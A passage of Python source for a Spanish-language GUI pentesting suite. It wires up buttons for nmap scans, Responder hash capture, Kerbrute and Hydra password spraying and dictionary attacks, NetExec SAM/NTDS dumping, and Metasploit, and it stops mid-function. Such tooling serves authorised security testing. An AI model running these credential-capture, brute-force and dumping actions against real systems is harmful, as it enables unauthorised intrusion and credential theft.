#!/usr/bin/env python3
"""
TSSad (by jukathaido) - Herramienta de Pentesting Ético
ADVERTENCIA: Solo para uso en entornos autorizados y pruebas de seguridad legítimas
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import subprocess
import threading
import os
import json
import datetime
import webbrowser
import time
import re
from tkinter import simpledialog

class TSSad:
    def __init__(self, root):
        self.root = root
        self.root.title("TSSad (by jukathaido) v1.0 - USO ÉTICO ÚNICAMENTE")
        self.root.geometry("1200x800")
        self.root.configure(bg='#2b2b2b')
        
        # Variables para procesos en ejecución
        self.running_processes = []
        self.scan_results = {}
        self.log_data = []
        
        # Archivos de trabajo
        self.hosts_file = "discovered_hosts.txt"
        self.discovered_hosts = []
        self.valid_users_file = "valid_users.txt"
        self.valid_users = []
        self.targets_file = "targets.txt"
        
        # Rutas de herramientas específicas
        self.kerbrute_path = "/home/kali/Aplicaciones/TSSad/kerbrute/dist/kerbrute_linux_amd64"
        
        # Variables para automatización
        self.automation_running = False
        self.automation_thread = None
        
        # Detectar terminal disponible
        self.available_terminal = self.detect_terminal()
        
        self.setup_ui()
        self.show_legal_warning()
        
        # Verificación inicial silenciosa de herramientas
        self.root.after(1000, self.initial_tools_check)
        
        # Cargar datos guardados al iniciar
        self.load_saved_data()
    
    def detect_terminal(self):
        """Detecta qué terminal está disponible en el sistema"""
        terminals = [
            ("xterm", ["-e"]),
            ("qterminal", ["-e"]),
            ("konsole", ["-e"]),
            ("terminator", ["-e"]),
            ("x-terminal-emulator", ["-e"])
        ]
        
        for terminal, args in terminals:
            try:
                # Verificar si el terminal existe
                result = subprocess.run(["which", terminal], 
                                      capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"🖥️ Terminal detectado: {terminal}")
                    return (terminal, args)
            except:
                continue
        
        # Si no se encuentra ninguno, usar xterm como fallback
        print("⚠️ No se detectó terminal específico, usando xterm como fallback")
        return ("xterm", ["-e"])
    
    def get_terminal_command(self, command):
        """Genera comando para ejecutar en terminal separado"""
        terminal, args = self.available_terminal
        
        if terminal == "qterminal":
            return [terminal] + args + [f"bash -c \"{command}; echo '\\nPresiona Enter para cerrar...'; read\""]
        elif terminal == "konsole":
            return [terminal] + args + [f"bash -c \"{command}; echo '\\nPresiona Enter para cerrar...'; read\""]
        else:  # xterm, terminator, x-terminal-emulator
            return [terminal] + args + [f"bash -c '{command}; echo; echo \"Presiona Enter para cerrar...\"; read'"]
    
    def show_legal_warning(self):
        """Muestra advertencia legal al inicio"""
        warning = """
        ⚠️ ADVERTENCIA LEGAL - TSSad (by jukathaido) ⚠️
        
        Esta herramienta está diseñada para Kali Linux 2025-2 y es ÚNICAMENTE para:
        
        ✅ Pruebas de penetración autorizadas
        ✅ Auditorías de seguridad legítimas  
        ✅ Entornos de laboratorio propios
        ✅ Fines educativos en entornos controlados
        
        ❌ El uso no autorizado de estas herramientas puede ser ILEGAL
        ❌ Prohibido su uso en sistemas no autorizados
        
        Al continuar, confirmas que:
        • Tienes autorización explícita por escrito
        • Usarás la herramienta de forma ética
        • Conoces las leyes aplicables en tu jurisdicción
        
        ¿Continuar bajo tu responsabilidad?
        """
        
        result = messagebox.askyesno("Advertencia Legal - TSSad", warning)
        if not result:
            self.root.destroy()
            return False
        return True
    
    def setup_ui(self):
        """Configura la interfaz de usuario"""
        # Estilo
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background='#2b2b2b')
        style.configure('TNotebook.Tab', background='#404040', foreground='white')
        
        # Frame principal
        main_frame = tk.Frame(self.root, bg='#2b2b2b')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Título
        title_label = tk.Label(main_frame, text="TSSad (by jukathaido) - Herramientas de Seguridad", 
                              font=('Arial', 16, 'bold'), fg='#00ff00', bg='#2b2b2b')
        title_label.pack(pady=10)
        
        # Botones principales
        self.setup_main_buttons(main_frame)
        
        # Notebook para las pestañas
        self.notebook = ttk.Notebook(main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Crear pestañas
        self.create_network_scan_tab()
        self.create_vuln_scan_tab()
        self.create_credential_tab()
        self.create_ad_analysis_tab()
        self.create_automation_tab()
        self.create_exploit_search_tab()
        self.create_attack_tab()
        
        # Área de logs
        self.setup_log_area(main_frame)
    
    def setup_main_buttons(self, parent):
        """Configura los botones principales"""
        button_frame = tk.Frame(parent, bg='#2b2b2b')
        button_frame.pack(fill=tk.X, pady=5)
        
        # Primera fila de botones
        top_buttons = tk.Frame(button_frame, bg='#2b2b2b')
        top_buttons.pack(fill=tk.X, pady=2)
        
        buttons_row1 = [
            ("Ejecutar", self.execute_command, '#00ff00'),
            ("Parar", self.stop_execution, '#ff6600'),
            ("Limpiar", self.clear_logs, '#ffff00'),
            ("Informe HTML", self.generate_html_report, '#0099ff'),
            ("Salir", self.exit_application, '#ff3333')
        ]
        
        for text, command, color in buttons_row1:
            btn = tk.Button(top_buttons, text=text, command=command, 
                           bg=color, fg='black', font=('Arial', 10, 'bold'),
                           width=12, height=2)
            btn.pack(side=tk.LEFT, padx=5)
        
        # Segunda fila con verificación de herramientas
        bottom_buttons = tk.Frame(button_frame, bg='#2b2b2b')
        bottom_buttons.pack(fill=tk.X, pady=2)
        
        verify_btn = tk.Button(bottom_buttons, text="Verificar Herramientas", 
                              command=self.check_tools_availability,
                              bg='#9900cc', fg='white', font=('Arial', 9, 'bold'),
                              width=20, height=1)
        verify_btn.pack(side=tk.LEFT, padx=5)
        
        # Información del sistema
        kerbrute_status = "✅" if os.path.exists(self.kerbrute_path) else "❌"
        nessus_status = "🟢" if "🟢" in self.check_nessus_status() else "🔴"
        system_info = tk.Label(bottom_buttons, 
                              text=f"Terminal: {self.available_terminal[0]} | Kerbrute: {kerbrute_status} | Nessus: {nessus_status}", 
                              font=('Arial', 8), fg='#888888', bg='#2b2b2b')
        system_info.pack(side=tk.RIGHT, padx=5)
    
    def create_network_scan_tab(self):
        """Crea la pestaña de escaneo de red"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.1 Escaneo de Red")
        
        # Target input
        tk.Label(frame, text="Rango de Red (ej: 192.168.1.0/24):", font=('Arial', 10, 'bold')).pack(pady=5)
        self.target_entry = tk.Entry(frame, width=50, font=('Arial', 10))
        self.target_entry.pack(pady=5)
        
        # Paso 1: Descubrimiento de hosts
        discovery_frame = tk.LabelFrame(frame, text="Paso 1: Descubrimiento de Hosts", font=('Arial', 10, 'bold'))
        discovery_frame.pack(fill=tk.X, padx=10, pady=10)
        
        discovery_btn = tk.Button(discovery_frame, text="1. Descubrir Hosts Vivos (-sn)", 
                                 command=self.start_host_discovery,
                                 bg='#00ccff', fg='black', font=('Arial', 11, 'bold'))
        discovery_btn.pack(pady=5)
        
        # Estado del archivo de hosts
        self.hosts_file_label = tk.Label(discovery_frame, text="Archivo de hosts: No generado", 
                                        font=('Arial', 9), fg='red')
        self.hosts_file_label.pack(pady=2)
        
        # Paso 2: Escaneo detallado
        detailed_frame = tk.LabelFrame(frame, text="Paso 2: Escaneo Detallado de Hosts Vivos", font=('Arial', 10, 'bold'))
        detailed_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Opciones de nmap para escaneo detallado
        self.nmap_options = {}
        nmap_opts = [
            ("-Pn", "No ping (hosts conocidos vivos)"),
            ("-A", "Detección agresiva"),
            ("-sS", "SYN scan"),
            ("-sV", "Detección de versiones"),
            ("-sC", "Scripts por defecto")
        ]
        
        for opt, desc in nmap_opts:
            var = tk.BooleanVar()
            # -Pn activado por defecto para hosts ya descobrtos
            if opt == "-Pn":
                var.set(True)
            self.nmap_options[opt] = var
            cb = tk.Checkbutton(detailed_frame, text=f"{opt} - {desc}", variable=var)
            cb.pack(anchor=tk.W, padx=10, pady=2)
        
        # Botón de escaneo detallado
        detailed_scan_btn = tk.Button(detailed_frame, text="2. Escanear Hosts Vivos", 
                                     command=self.start_detailed_scan,
                                     bg='#00ff00', fg='black', font=('Arial', 11, 'bold'))
        detailed_scan_btn.pack(pady=5)
        
        # Botón para ver hosts descubiertos
        view_hosts_btn = tk.Button(frame, text="Ver Hosts Descubiertos", 
                                  command=self.view_discovered_hosts,
                                  bg='#ffff00', fg='black', font=('Arial', 10, 'bold'))
        view_hosts_btn.pack(pady=5)
        
        # Nota sobre opciones por defecto
        note_label = tk.Label(frame, text="Nota: El escaneo detallado usará por defecto -p-, --open, -vvv",
                             font=('Arial', 9), fg='gray')
        note_label.pack(pady=5)
    
    def create_vuln_scan_tab(self):
        """Crea la pestaña de escaneo de vulnerabilidades"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.2 Escaneo Vulnerabilidades")
        
        tk.Label(frame, text="Escaneo de Vulnerabilidades en Hosts Descubiertos", 
                font=('Arial', 12, 'bold')).pack(pady=10)
        
        # Estado del archivo de hosts
        self.vuln_hosts_status = tk.Label(frame, text="Esperando hosts descubiertos...", 
                                         font=('Arial', 10), fg='orange')
        self.vuln_hosts_status.pack(pady=5)
        
        # Opción manual (opcional)
        manual_frame = tk.LabelFrame(frame, text="Escaneo Manual (Opcional)", font=('Arial', 10, 'bold'))
        manual_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(manual_frame, text="Objetivo específico:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.vuln_target_entry = tk.Entry(manual_frame, width=50, font=('Arial', 10))
        self.vuln_target_entry.pack(pady=5)
        
        manual_btn = tk.Button(manual_frame, text="Escanear Objetivo Manual", 
                              command=self.start_manual_vuln_scan,
                              bg='#ff9900', fg='black', font=('Arial', 10, 'bold'))
        manual_btn.pack(pady=5)
        
        # Botones de escaneo principal
        btn_frame = tk.Frame(frame)
        btn_frame.pack(pady=20)
        
        nmap_vuln_btn = tk.Button(btn_frame, text="Nmap --script vuln\n(Hosts Descubiertos)", 
                                 command=self.start_nmap_vuln_scan,
                                 bg='#ff6600', fg='white', font=('Arial', 11, 'bold'),
                                 height=2)
        nmap_vuln_btn.pack(side=tk.LEFT, padx=10)
        
        # Frame para Nessus con múltiples controles
        nessus_frame = tk.LabelFrame(btn_frame, text="Nessus Control", font=('Arial', 9, 'bold'))
        nessus_frame.pack(side=tk.LEFT, padx=10)
        
        # Botones de Nessus
        nessus_controls = tk.Frame(nessus_frame)
        nessus_controls.pack(pady=5)
        
        nessus_start_btn = tk.Button(nessus_controls, text="Iniciar", 
                                    command=self.start_nessus,
                                    bg='#9900ff', fg='white', font=('Arial', 9, 'bold'),
                                    width=8)
        nessus_start_btn.pack(side=tk.LEFT, padx=2)
        
        nessus_stop_btn = tk.Button(nessus_controls, text="Parar", 
                                   command=self.stop_nessus,
                                   bg='#ff4444', fg='white', font=('Arial', 9, 'bold'),
                                   width=8)
        nessus_stop_btn.pack(side=tk.LEFT, padx=2)
        
        # Estado de Nessus
        self.nessus_status_label = tk.Label(nessus_frame, text="Estado: Verificando...", 
                                           font=('Arial', 8), fg='gray')
        self.nessus_status_label.pack(pady=2)
        
        # Botón para verificar estado
        check_status_btn = tk.Button(nessus_frame, text="Verificar Estado", 
                                    command=self.update_nessus_status,
                                    bg='#666666', fg='white', font=('Arial', 8),
                                    width=15)
        check_status_btn.pack(pady=2)
        
        # Botón para ver vulnerabilidades encontradas
        view_vulns_btn = tk.Button(frame, text="Ver Vulnerabilidades Encontradas", 
                                  command=self.view_discovered_vulnerabilities,
                                  bg='#ff9900', fg='black', font=('Arial', 10, 'bold'))
        view_vulns_btn.pack(pady=10)
        
        # Actualizar estado inicial
        self.root.after(2000, self.update_nessus_status)
    
    def create_credential_tab(self):
        """Crea la pestaña de recolección de credenciales"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.3 Recolección Credenciales")
        
        tk.Label(frame, text="Herramienta Responder", font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Interfaz de red
        tk.Label(frame, text="Interfaz de red:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.interface_entry = tk.Entry(frame, width=30, font=('Arial', 10))
        self.interface_entry.insert(0, "eth0")  # valor por defecto
        self.interface_entry.pack(pady=5)
        
        # Botón para iniciar responder
        responder_btn = tk.Button(frame, text="Iniciar Responder", 
                                 command=self.start_responder,
                                 bg='#ff9900', fg='black', font=('Arial', 12, 'bold'))
        responder_btn.pack(pady=10)
        
        # Información
        info_text = """
        Responder capturará hashes NTLM y otros credenciales.
        Esta ventana se mantendrá ejecutándose hasta que la cierres manualmente.
        Los resultados se guardarán automáticamente.
        """
        tk.Label(frame, text=info_text, font=('Arial', 9), fg='gray', justify=tk.LEFT).pack(pady=10)
    
    def create_ad_analysis_tab(self):
        """Crea la pestaña de análisis de Active Directory"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.4 Análisis AD")
        
        # Configuración de dominio
        config_frame = tk.LabelFrame(frame, text="Configuración de Dominio", font=('Arial', 10, 'bold'))
        config_frame.pack(fill=tk.X, padx=10, pady=10)
        
        tk.Label(config_frame, text="Dominio:", font=('Arial', 10, 'bold')).grid(row=0, column=0, sticky=tk.W, padx=5, pady=5)
        self.domain_entry = tk.Entry(config_frame, width=30, font=('Arial', 10))
        self.domain_entry.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(config_frame, text="Controlador de Dominio:", font=('Arial', 10, 'bold')).grid(row=1, column=0, sticky=tk.W, padx=5, pady=5)
        self.dc_entry = tk.Entry(config_frame, width=30, font=('Arial', 10))
        self.dc_entry.grid(row=1, column=1, padx=5, pady=5)
        
        tk.Label(config_frame, text="Rango de IPs:", font=('Arial', 10, 'bold')).grid(row=2, column=0, sticky=tk.W, padx=5, pady=5)
        self.ip_range_entry = tk.Entry(config_frame, width=30, font=('Arial', 10))
        self.ip_range_entry.grid(row=2, column=1, padx=5, pady=5)
        
        # Estado de usuarios válidos encontrados
        self.valid_users_status = tk.Label(config_frame, text="Usuarios válidos: No encontrados", 
                                          font=('Arial', 9), fg='red')
        self.valid_users_status.grid(row=3, column=0, columnspan=2, pady=5)
        
        # Herramientas AD
        tools_frame = tk.Frame(frame)
        tools_frame.pack(pady=20)
        
        # Botón para iniciar kerbrute con información adicional
        kerbrute_frame = tk.Frame(tools_frame)
        kerbrute_frame.pack(side=tk.LEFT, padx=10)
        
        kerbrute_btn = tk.Button(kerbrute_frame, text="Kerbrute (Enum Usuarios)", 
                                command=self.start_kerbrute,
                                bg='#00ccff', fg='black', font=('Arial', 12, 'bold'))
        kerbrute_btn.pack()
        
        # Botón para wordlists sugeridas
        wordlist_btn = tk.Button(kerbrute_frame, text="Ver Wordlists Sugeridas", 
                                command=self.show_wordlists_info,
                                bg='#ffcc00', fg='black', font=('Arial', 8))
        wordlist_btn.pack(pady=2)
        
        # Botón para ver usuarios válidos encontrados
        view_users_btn = tk.Button(kerbrute_frame, text="Ver Usuarios Válidos", 
                                  command=self.view_valid_users,
                                  bg='#00ff99', fg='black', font=('Arial', 8))
        view_users_btn.pack(pady=2)
        
        netexec_btn = tk.Button(tools_frame, text="NetExec", 
                               command=self.start_netexec_config,
                               bg='#cc00ff', fg='white', font=('Arial', 12, 'bold'))
        netexec_btn.pack(side=tk.LEFT, padx=10)
    
    def create_automation_tab(self):
        """Crea la pestaña de ejecución automatizada"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.5 Ejecución Automatizada")
        
        tk.Label(frame, text="Ejecución Automatizada de Herramientas", 
                font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Estado de datos disponibles para automatización
        status_frame = tk.LabelFrame(frame, text="Estado de Datos para Automatización", font=('Arial', 10, 'bold'))
        status_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.auto_network_status = tk.Label(status_frame, text="Rango de red: No configurado", 
                                           font=('Arial', 9), fg='red')
        self.auto_network_status.pack(pady=2)
        
        self.auto_hosts_status = tk.Label(status_frame, text="Hosts descubiertos: 0", 
                                         font=('Arial', 9), fg='red')
        self.auto_hosts_status.pack(pady=2)
        
        self.auto_domain_status = tk.Label(status_frame, text="Dominio AD: No configurado", 
                                          font=('Arial', 9), fg='red')
        self.auto_domain_status.pack(pady=2)
        
        # Selector de pasos a ejecutar
        steps_frame = tk.LabelFrame(frame, text="Seleccionar Pasos a Ejecutar", font=('Arial', 10, 'bold'))
        steps_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.auto_steps = {}
        steps = [
            ("step1", "1. Descubrimiento de Hosts (nmap -sn)", True),
            ("step2", "2. Escaneo Detallado de Puertos", True),
            ("step3", "3. Escaneo de Vulnerabilidades (nmap --script vuln)", True),
            ("step4", "4. Enumeración de Usuarios AD (Kerbrute)", False),
            ("step5", "5. Búsqueda de Exploits (SearchSploit)", False),
            ("step6", "6. Password Spray (si hay contraseña)", False)
        ]
        
        for step_key, step_desc, default_value in steps:
            var = tk.BooleanVar(value=default_value)
            self.auto_steps[step_key] = var
            cb = tk.Checkbutton(steps_frame, text=step_desc, variable=var, font=('Arial', 9))
            cb.pack(anchor=tk.W, padx=10, pady=2)
        
        # Configuración adicional para automatización
        config_frame = tk.LabelFrame(frame, text="Configuración para Automatización", font=('Arial', 10, 'bold'))
        config_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Password para spray automático
        auto_config_grid = tk.Frame(config_frame)
        auto_config_grid.pack(fill=tk.X, pady=5)
        
        tk.Label(auto_config_grid, text="Contraseña para Password Spray:", font=('Arial', 9)).grid(row=0, column=0, sticky=tk.W, padx=5)
        self.auto_password_entry = tk.Entry(auto_config_grid, width=20, font=('Arial', 9), show='*')
        self.auto_password_entry.grid(row=0, column=1, padx=5)
        
        tk.Label(auto_config_grid, text="Wordlist usuarios (opcional):", font=('Arial', 9)).grid(row=1, column=0, sticky=tk.W, padx=5)
        self.auto_userlist_entry = tk.Entry(auto_config_grid, width=30, font=('Arial', 9))
        self.auto_userlist_entry.grid(row=1, column=1, padx=5)
        
        browse_btn = tk.Button(auto_config_grid, text="Explorar", command=self.browse_auto_userlist,
                              bg='#666666', fg='white', font=('Arial', 8))
        browse_btn.grid(row=1, column=2, padx=5)
        
        # Progreso de automatización
        progress_frame = tk.LabelFrame(frame, text="Progreso de Ejecución", font=('Arial', 10, 'bold'))
        progress_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.auto_progress_label = tk.Label(progress_frame, text="Listo para iniciar", font=('Arial', 9))
        self.auto_progress_label.pack(pady=5)
        
        self.auto_progress_bar = ttk.Progressbar(progress_frame, length=400, mode='determinate')
        self.auto_progress_bar.pack(pady=5)
        
        # Botones de control
        button_frame = tk.Frame(frame)
        button_frame.pack(pady=20)
        
        # Botón principal de ejecución
        auto_btn = tk.Button(button_frame, text="🚀 Ejecutar Suite Automatizada", 
                            command=self.start_automated_execution,
                            bg='#ffff00', fg='black', font=('Arial', 12, 'bold'),
                            height=2, width=25)
        auto_btn.pack(side=tk.LEFT, padx=10)
        
        # Botón para actualizar estado
        refresh_auto_btn = tk.Button(button_frame, text="Actualizar Estado", 
                                    command=self.update_automation_status,
                                    bg='#666666', fg='white', font=('Arial', 10))
        refresh_auto_btn.pack(side=tk.LEFT, padx=10)
        
        # Botón para parar automatización
        stop_auto_btn = tk.Button(button_frame, text="🛑 Parar Automatización", 
                                 command=self.stop_automation,
                                 bg='#ff3333', fg='white', font=('Arial', 10))
        stop_auto_btn.pack(side=tk.LEFT, padx=10)
        
        # Actualizar estado inicial
        self.root.after(3000, self.update_automation_status)
    
    def create_exploit_search_tab(self):
        """Crea la pestaña de búsqueda de exploits"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.6 Búsqueda Exploits")
        
        tk.Label(frame, text="Búsqueda de Exploits con SearchSploit", 
                font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Búsqueda manual
        tk.Label(frame, text="Buscar exploit:", font=('Arial', 10, 'bold')).pack(pady=5)
        self.exploit_search_entry = tk.Entry(frame, width=50, font=('Arial', 10))
        self.exploit_search_entry.pack(pady=5)
        
        search_btn = tk.Button(frame, text="Buscar Exploits", 
                              command=self.search_exploits,
                              bg='#ff3300', fg='white', font=('Arial', 12, 'bold'))
        search_btn.pack(pady=10)
        
        # Búsqueda automática
        auto_search_btn = tk.Button(frame, text="Buscar Exploits Automáticamente", 
                                   command=self.auto_search_exploits,
                                   bg='#ff6600', fg='white', font=('Arial', 12, 'bold'))
        auto_search_btn.pack(pady=10)
        
        tk.Label(frame, text="(Basado en servicios encontrados en escaneos)", 
                font=('Arial', 9), fg='gray').pack(pady=5)
    
    def create_attack_tab(self):
        """Crea la pestaña de ataques"""
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text="1.7 Ataques")
        
        tk.Label(frame, text="Herramientas de Ataque", font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Estado de datos disponibles
        status_frame = tk.LabelFrame(frame, text="Estado de Datos", font=('Arial', 10, 'bold'))
        status_frame.pack(fill=tk.X, padx=10, pady=5)
        
        status_grid = tk.Frame(status_frame)
        status_grid.pack(fill=tk.X, pady=5)
        
        # Primera fila de estado
        self.attack_hosts_status = tk.Label(status_grid, text="Hosts vivos: No disponibles", 
                                           font=('Arial', 8), fg='red')
        self.attack_hosts_status.grid(row=0, column=0, sticky=tk.W, padx=5)
        
        self.attack_users_status = tk.Label(status_grid, text="Usuarios válidos: No disponibles", 
                                           font=('Arial', 8), fg='red')
        self.attack_users_status.grid(row=0, column=1, sticky=tk.W, padx=5)
        
        # Segunda fila de estado
        self.attack_domain_status = tk.Label(status_grid, text="Dominio configurado: No", 
                                            font=('Arial', 8), fg='red')
        self.attack_domain_status.grid(row=1, column=0, sticky=tk.W, padx=5)
        
        self.attack_creds_status = tk.Label(status_grid, text="Credenciales encontradas: 0", 
                                           font=('Arial', 8), fg='red')
        self.attack_creds_status.grid(row=1, column=1, sticky=tk.W, padx=5)
        
        # Botón para actualizar estado
        refresh_btn = tk.Button(status_frame, text="🔄 Actualizar Estado", 
                               command=self.update_attack_status,
                               bg='#666666', fg='white', font=('Arial', 8))
        refresh_btn.pack(pady=3)
        
        # SECCIÓN 1: Kerbrute Ataques (ya existente)
        kerbrute_frame = tk.LabelFrame(frame, text="🔑 Kerbrute - Ataques AD", font=('Arial', 10, 'bold'))
        kerbrute_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Password Spray
        spray_frame = tk.Frame(kerbrute_frame)
        spray_frame.pack(fill=tk.X, pady=3)
        
        tk.Label(spray_frame, text="Password Spray:", font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        self.password_entry = tk.Entry(spray_frame, width=15, font=('Arial', 9), show='*')
        self.password_entry.pack(side=tk.LEFT, padx=5)
        
        spray_btn = tk.Button(spray_frame, text="🎯 Ejecutar Password Spray", 
                             command=self.start_password_spray,
                             bg='#ff9900', fg='black', font=('Arial', 9, 'bold'))
        spray_btn.pack(side=tk.LEFT, padx=5)
        
        # Ataque por diccionario
        dict_frame = tk.Frame(kerbrute_frame)
        dict_frame.pack(fill=tk.X, pady=3)
        
        tk.Label(dict_frame, text="Usuario objetivo:", font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        self.target_user_entry = tk.Entry(dict_frame, width=15, font=('Arial', 9))
        self.target_user_entry.pack(side=tk.LEFT, padx=5)
        
        dict_btn = tk.Button(dict_frame, text="📚 Ataque por Diccionario", 
                            command=self.start_dictionary_attack,
                            bg='#ff6600', fg='white', font=('Arial', 9, 'bold'))
        dict_btn.pack(side=tk.LEFT, padx=5)
        
        # SECCIÓN 2: NetExec Ataques
        netexec_frame = tk.LabelFrame(frame, text="🌐 NetExec - Ataques Multi-Protocolo", font=('Arial', 10, 'bold'))
        netexec_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Configuración NetExec
        netexec_config = tk.Frame(netexec_frame)
        netexec_config.pack(fill=tk.X, pady=3)
        
        tk.Label(netexec_config, text="Protocolo:", font=('Arial', 9, 'bold')).grid(row=0, column=0, sticky=tk.W, padx=5)
        self.netexec_protocol = ttk.Combobox(netexec_config, values=["smb", "rdp", "ssh", "ftp", "ldap", "mssql", "winrm"], 
                                            width=8, font=('Arial', 9))
        self.netexec_protocol.set("smb")
        self.netexec_protocol.grid(row=0, column=1, padx=5)
        
        tk.Label(netexec_config, text="Usuario:", font=('Arial', 9, 'bold')).grid(row=0, column=2, sticky=tk.W, padx=5)
        self.netexec_user = tk.Entry(netexec_config, width=12, font=('Arial', 9))
        self.netexec_user.grid(row=0, column=3, padx=5)
        
        tk.Label(netexec_config, text="Contraseña:", font=('Arial', 9, 'bold')).grid(row=0, column=4, sticky=tk.W, padx=5)
        self.netexec_password = tk.Entry(netexec_config, width=12, font=('Arial', 9), show='*')
        self.netexec_password.grid(row=0, column=5, padx=5)
        
        # Botones NetExec
        netexec_buttons = tk.Frame(netexec_frame)
        netexec_buttons.pack(fill=tk.X, pady=3)
        
        # Fila 1 de botones NetExec
        netexec_row1 = tk.Frame(netexec_buttons)
        netexec_row1.pack(fill=tk.X, pady=2)
        
        netexec_spray_btn = tk.Button(netexec_row1, text="💥 Password Spray", 
                                     command=self.netexec_password_spray,
                                     bg='#cc00ff', fg='white', font=('Arial', 8, 'bold'))
        netexec_spray_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_users_btn = tk.Button(netexec_row1, text="👥 Spray Usuarios", 
                                     command=self.netexec_user_spray,
                                     bg='#9900cc', fg='white', font=('Arial', 8, 'bold'))
        netexec_users_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_dict_btn = tk.Button(netexec_row1, text="📖 Ataque Diccionario", 
                                    command=self.netexec_dictionary_attack,
                                    bg='#6600cc', fg='white', font=('Arial', 8, 'bold'))
        netexec_dict_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_creds_btn = tk.Button(netexec_row1, text="🔓 Probar Credenciales Guardadas", 
                                     command=self.netexec_test_credentials,
                                     bg='#3300cc', fg='white', font=('Arial', 8, 'bold'))
        netexec_creds_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_creds_individual_btn = tk.Button(netexec_row1, text="🎯 Probar Individual", 
                                                 command=self.netexec_test_credentials_individual,
                                                 bg='#4400cc', fg='white', font=('Arial', 8, 'bold'))
        netexec_creds_individual_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_manual_btn = tk.Button(netexec_row1, text="🧪 Probar Manual", 
                                      command=self.netexec_test_manual,
                                      bg='#6600ff', fg='white', font=('Arial', 8, 'bold'))
        netexec_manual_btn.pack(side=tk.LEFT, padx=3)
        
        # Fila 2 de botones NetExec
        netexec_row2 = tk.Frame(netexec_buttons)
        netexec_row2.pack(fill=tk.X, pady=2)
        
        netexec_enum_btn = tk.Button(netexec_row2, text="🔍 Enumerar Recursos", 
                                    command=self.netexec_enumerate,
                                    bg='#0066cc', fg='white', font=('Arial', 8, 'bold'))
        netexec_enum_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_shares_btn = tk.Button(netexec_row2, text="📂 Listar Shares", 
                                      command=self.netexec_list_shares,
                                      bg='#0099cc', fg='white', font=('Arial', 8, 'bold'))
        netexec_shares_btn.pack(side=tk.LEFT, padx=3)
        
        netexec_dump_btn = tk.Button(netexec_row2, text="💾 Dump SAM/NTDS", 
                                    command=self.netexec_dump_secrets,
                                    bg='#00cccc', fg='black', font=('Arial', 8, 'bold'))
        netexec_dump_btn.pack(side=tk.LEFT, padx=3)
        
        # SECCIÓN 3: Ataques con Hydra
        hydra_frame = tk.LabelFrame(frame, text="💧 Hydra - Ataques de Fuerza Bruta", font=('Arial', 10, 'bold'))
        hydra_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Configuración Hydra
        hydra_config = tk.Frame(hydra_frame)
        hydra_config.pack(fill=tk.X, pady=3)
        
        tk.Label(hydra_config, text="Protocolo:", font=('Arial', 9, 'bold')).grid(row=0, column=0, sticky=tk.W, padx=5)
        self.hydra_protocol = ttk.Combobox(hydra_config, values=["ssh", "ftp", "telnet", "smb", "rdp", "http-get", "http-post-form"], 
                                          width=12, font=('Arial', 9))
        self.hydra_protocol.set("ssh")
        self.hydra_protocol.grid(row=0, column=1, padx=5)
        
        tk.Label(hydra_config, text="Puerto:", font=('Arial', 9, 'bold')).grid(row=0, column=2, sticky=tk.W, padx=5)
        self.hydra_port = tk.Entry(hydra_config, width=6, font=('Arial', 9))
        self.hydra_port.insert(0, "22")
        self.hydra_port.grid(row=0, column=3, padx=5)
        
        # Botones Hydra
        hydra_buttons = tk.Frame(hydra_frame)
        hydra_buttons.pack(fill=tk.X, pady=3)
        
        hydra_spray_btn = tk.Button(hydra_buttons, text="🌊 Hydra Password Spray", 
                                   command=self.hydra_password_spray,
                                   bg='#0066ff', fg='white', font=('Arial', 9, 'bold'))
        hydra_spray_btn.pack(side=tk.LEFT, padx=5)
        
        hydra_dict_btn = tk.Button(hydra_buttons, text="🔨 Hydra Diccionario", 
                                  command=self.hydra_dictionary_attack,
                                  bg='#0033ff', fg='white', font=('Arial', 9, 'bold'))
        hydra_dict_btn.pack(side=tk.LEFT, padx=5)
        
        hydra_combo_btn = tk.Button(hydra_buttons, text="🎯 Hydra Combo", 
                                   command=self.hydra_combo_attack,
                                   bg='#0000ff', fg='white', font=('Arial', 9, 'bold'))
        hydra_combo_btn.pack(side=tk.LEFT, padx=5)
        
        # SECCIÓN 4: Otras Herramientas
        other_frame = tk.LabelFrame(frame, text="🛠️ Otras Herramientas de Ataque", font=('Arial', 10, 'bold'))
        other_frame.pack(fill=tk.X, padx=10, pady=5)
        
        # Botones de otras herramientas
        other_buttons = tk.Frame(other_frame)
        other_buttons.pack(pady=5)
        
        metasploit_btn = tk.Button(other_buttons, text="🚀 Metasploit Console", 
                                  command=self.start_metasploit,
                                  bg='#ff0000', fg='white', font=('Arial', 10, 'bold'))
